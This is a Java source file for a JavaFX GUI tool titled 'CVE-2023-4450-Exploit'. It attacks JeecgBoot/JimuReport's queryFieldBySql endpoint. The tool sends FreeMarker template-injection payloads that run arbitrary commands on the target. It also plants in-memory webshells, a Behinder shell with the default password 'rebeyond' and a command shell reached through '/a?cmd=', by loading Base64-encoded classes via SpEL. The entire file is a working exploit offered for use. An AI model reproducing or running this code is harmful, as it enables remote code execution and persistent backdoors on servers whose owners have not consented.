import javafx.application.Application;
import javafx.scene.Scene;
import javafx.scene.control.Button;
import javafx.scene.control.Label;
import javafx.scene.control.TextArea;
import javafx.scene.control.TextField;
import javafx.scene.layout.VBox;
import javafx.stage.Stage;
import Command_execution.Exp;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class View extends Application {

    private Exp exp = new Exp(); // 创建Exp对象

    public static void main(String[] args) {
        launch(args);
    }

    @Override
    public void start(Stage primaryStage) {
        // 创建文本框、按钮和文本区域
        TextField urlTextField = new TextField();
        Button runButton = new Button("RUN");
        Button injectButton = new Button("冰蝎内存马注入");
        Button cmdButton = new Button("CMD内存马注入");
        TextField dataTextField = new TextField();
        TextArea responseTextArea = new TextArea();
        responseTextArea.setEditable(false); // 使文本区域不可编辑

        // 命令执行
        runButton.setOnAction(e -> {
            String url = urlTextField.getText();
            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }
            String cmd = dataTextField.getText();
            if (url.isEmpty()) {
                responseTextArea.setText("请输入URL（如：http://localhost:8085/）");
            } else {
                // 执行Exp中的代码
                try {
                    String payload = "{\"sql\":\"select '<#assign value=\\\"freemarker.template.utility.Execute\\\"?new()>${value(\\\""+cmd+"\\\")}'\"}";
                    String response = exp.sendPostRequest(url+"/jmreport/queryFieldBySql", payload);
                    String pattern = "\"fieldText\":\"(.*?)\"";
                    Pattern regex = Pattern.compile(pattern);
                    Matcher matcher = regex.matcher(response);

                    // 查找匹配的字符串
                    if (matcher.find()) {
                        response =  matcher.group(1);
                    }
                    responseTextArea.setText("[+] 命令执行成功:\n" + response);
                } catch (Exception ex) {
                    responseTextArea.setText("发生错误: " + ex.getMessage());
                }
            }
        });

        // 冰蝎内存马注入
        injectButton.setOnAction(e -> {
            String url = urlTextField.getText();

            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            if (url.isEmpty()) {
                responseTextArea.setText("请输入合法URL");
            } else {
                // 执行Exp中的代码
                try {
                    GetBytes getBytes = new GetBytes();
                    String encrypo = getBytes.getbytes(BehinderShell.class);
                    String payload = "{\"sql\":\"<#assign ex=\\\"freemarker.template.utility.ObjectConstructor\\\"?new()>${ex(\\\"org.springframework.expression.spel.standard.SpelExpressionParser\\\").parseExpression(\\\"T(org.springframework.cglib.core.ReflectUtils).defineClass('BehinderShell',T(org.springframework.util.Base64Utils).decodeFromString('"+encrypo+"'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()\\\").getValue()}\"}";
                    String response = exp.sendPostRequest(url+"/jmreport/queryFieldBySql", payload);
                    if (response.contains("BehinderShell")) {
                        responseTextArea.setText("[+] 冰蝎内存马注入成功：请使用URL连接，默认密码为rebeyond");
                    } else {
                        responseTextArea.setText("[-] 注入失败");
                    }
                } catch (Exception ex) {
                    responseTextArea.setText("发生错误: " + ex.getMessage());
                }
            }
        });

        // CMD内存马注入
        cmdButton.setOnAction(e -> {
            String url = urlTextField.getText();

            if (url.endsWith("/")) {
                url = url.substring(0, url.length() - 1);
            }

            if (url.isEmpty()) {
                responseTextArea.setText("请输入合法URL");
            } else {
                // 执行Exp中的代码
                try {
                    GetBytes getBytes = new GetBytes();
                    String encrypo = getBytes.getbytes(InceptorMemShell.class);
                    String payload = "{\"sql\":\"<#assign ex=\\\"freemarker.template.utility.ObjectConstructor\\\"?new()>${ex(\\\"org.springframework.expression.spel.standard.SpelExpressionParser\\\").parseExpression(\\\"T(org.springframework.cglib.core.ReflectUtils).defineClass('InceptorMemShell',T(org.springframework.util.Base64Utils).decodeFromString('"+encrypo+"'),T(java.lang.Thread).currentThread().getContextClassLoader()).newInstance()\\\").getValue()}\"}";
                    String response = exp.sendPostRequest(url+"/jmreport/queryFieldBySql", payload);
                    if (response.contains("InceptorMemShell")) {
                        responseTextArea.setText("[+] CMD内存马注入成功：请访问URL/a?cmd=whoami");
                    } else {
                        responseTextArea.setText("[-] 注入失败");
                    }
                } catch (Exception ex) {
                    responseTextArea.setText("发生错误: " + ex.getMessage());
                }
            }
        });

        // 创建垂直布局
        VBox layout = new VBox(10);
        layout.getChildren().addAll(
                new Label("请输入URL(如：http://localhost:8085/ 或者 http://localhost:8085/jeecg-boot/):"), urlTextField,
                new Label("请输入要执行的命令:"), dataTextField, // 新的输入框
                runButton,
                injectButton,
                cmdButton,
                responseTextArea
        );
        urlTextField.setPrefColumnCount(1);

        // 创建场景
        Scene scene = new Scene(layout, 1000, 800);

        // 设置主舞台的标题和场景
        primaryStage.setTitle("CVE-2023-4450-Exploit");
        primaryStage.setScene(scene);

        // 显示主舞台
        primaryStage.show();
    }
}


